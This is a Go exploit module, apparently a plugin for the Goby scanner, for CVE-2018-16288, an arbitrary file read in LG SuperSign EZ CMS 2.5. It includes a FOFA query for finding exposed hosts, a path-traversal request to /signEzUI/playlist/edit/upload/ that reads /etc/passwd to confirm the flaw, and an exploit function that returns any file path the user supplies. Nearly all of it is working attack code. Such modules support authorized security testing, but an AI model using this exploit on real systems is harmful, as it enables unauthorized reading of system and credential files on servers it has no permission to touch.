package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "LG SuperSign EZ CMS 2.5 Arbitrary File Read (CVE-2018-16288)",
    "Description": "LG SuperSign CMS allows reading of arbitrary files via signEzUI/playlist/edit/upload/..%2f URIs",
    "Impact": "LG SuperSign EZ CMS 2.5 Arbitrary File Read (CVE-2018-16288)",
    "Recommendation": "update",
    "Product": "LG SuperSign EZ CMS 2.5",
    "VulType": [
        "File Read"
    ],
    "Tags": [
        "File Read"
    ],
    "Translation": {
        "CN": {
            "Name": "LGSupersignEzCMS的upload页面存在任意文件下载",
            "Description": "LG的SuperSign是一款移动标牌内容管理软件。只需及其简单的几步即可体验到简单易用的内容管理软件创建内容和播放列表。而在未授权的情况下，攻击者仅仅通过upload页面url的后面跟上多个../即可达成目录跳转，实现任意文件下载。",
            "Impact": "<p>攻击者可往有漏洞的cms直接输入跳转目录代码，如果没有对传入的参数进行过滤，就可以实现下载服务任何文件，产生任意文件下载漏洞。比如下载数据库配置文件，可以导致黑客顺利进入数据库或者系统的敏感信息。导致网站或者服务器沦陷。</p>",
            "Recommendation": "<p> 1、在下载前对传入的参数进行过滤，直接将..替换成空，就可以简单实现防范的目的。</p><p>2、升级至最新版本。网址：<a href=\"https://www.lg.com/ar/software-lg-supersign\" rel=\"nofollow\">https://www.lg.com/ar/software-lg-supersign</a></p>",
            "Product": "LG SuperSign EZ CMS",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "LG SuperSign EZ CMS 2.5 Arbitrary File Read (CVE-2018-16288)",
            "Description": "LG SuperSign CMS allows reading of arbitrary files via signEzUI/playlist/edit/upload/..%2f URIs",
            "Impact": "LG SuperSign EZ CMS 2.5 Arbitrary File Read (CVE-2018-16288)",
            "Recommendation": "update",
            "Product": "LG SuperSign EZ CMS 2.5",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "FofaQuery": "title=\"SuperSign EZ\"",
    "GobyQuery": "title=\"SuperSign EZ\"",
    "Author": "Ovi3",
    "Homepage": "https://www.lg.com/ar/software-lg-supersign",
    "DisclosureDate": "2018-09-14",
    "References": [
        "https://www.exploit-db.com/exploits/45440/"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "2",
    "CVSS": "8.6",
    "CVEIDs": [
        "CVE-2018-16288"
    ],
    "CNVD": [],
    "CNNVD": [
        "CNNVD-201809-727"
    ],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "filePath",
            "type": "input",
            "value": "../../../../../../../../../../../etc/passwd",
            "show": ""
        }
    ],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [
            "SuperSign-EZ"
        ],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "9687"
}`

	readFile := func(u *httpclient.FixUrl, filePath string) string {
		filePath = strings.ReplaceAll(filePath, "/", "%2F")
		cfg := httpclient.NewGetRequestConfig("/signEzUI/playlist/edit/upload/" + filePath)
		cfg.VerifyTls = false
		cfg.FollowRedirect = false
		if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
			return resp.RawBody
		}
		return ""
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			content := readFile(u, "../../../../../../../../../../../etc/passwd")
			return regexp.MustCompile(`root:[x*]?:0:0`).MatchString(content)
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			filePath := ss.Params["filePath"].(string)
			content := readFile(expResult.HostInfo, filePath)
			expResult.Success = true
			expResult.Output = content
			return expResult
		},
	))
}
